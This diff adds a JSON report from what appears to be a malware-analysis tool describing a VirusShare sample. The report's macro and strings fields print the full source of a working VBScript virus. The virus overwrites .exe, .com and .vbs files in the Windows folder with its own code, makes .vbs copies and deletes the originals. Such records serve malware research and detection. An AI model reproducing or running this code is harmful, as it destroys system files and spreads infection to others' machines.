@@ -1,0 +1,52 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "WINDOWS": "May enumerate application windows",
+            "createobject": "May create an OLE object",
+            "write": "May write to a file"
+        },
+        "macro": "Set fso=createobject(\"scripting.filesystemobject\")\nset self=fso.opentextfile(wscript.scriptfullname,l)\nvbscopy=self.readall\nset folder=fso.getfolder(\"c:\\WINDOWS\")\nset files=folder.files\nfor each file in files\next=fso.GetExtensionName(file)\next=lcase(ext)\nif ext=\"exe\" or ext=\"com\" or ext=\"vbs\" then\nSet f = fso.GetFile(file)\nset ap=fso.opentextfile(f.path,2,1)\nap.write vbscopy\nap.close\nf.copy(f.path & \".vbs\")\nf.delete(1)\nend if\nnext"
+    },
+    "filename": "VirusShare_020fd2708853bd0405899b1591132949",
+    "filesize": 452,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "020fd2708853bd0405899b1591132949",
+        "sha1": "95300ce6d9175922e10fec2a71008ee5c0654d1d",
+        "sha256": "6904b711a17821350a7181f90ae15ed1e561d70f6b7a21b05f954b0b1ca9c5b6"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Set fso=createobject(\"scripting.filesystemobject\")",
+            "set self=fso.opentextfile(wscript.scriptfullname,l)",
+            "vbscopy=self.readall",
+            "set folder=fso.getfolder(\"c:\\WINDOWS\")",
+            "set files=folder.files",
+            "for each file in files",
+            "ext=fso.GetExtensionName(file)",
+            "ext=lcase(ext)",
+            "if ext=\"exe\" or ext=\"com\" or ext=\"vbs\" then",
+            "Set f = fso.GetFile(file)",
+            "set ap=fso.opentextfile(f.path,2,1)",
+            "ap.write vbscopy",
+            "ap.close",
+            "f.copy(f.path & \".vbs\")",
+            "f.delete(1)",
+            "end if",
+            "next"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.282204",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
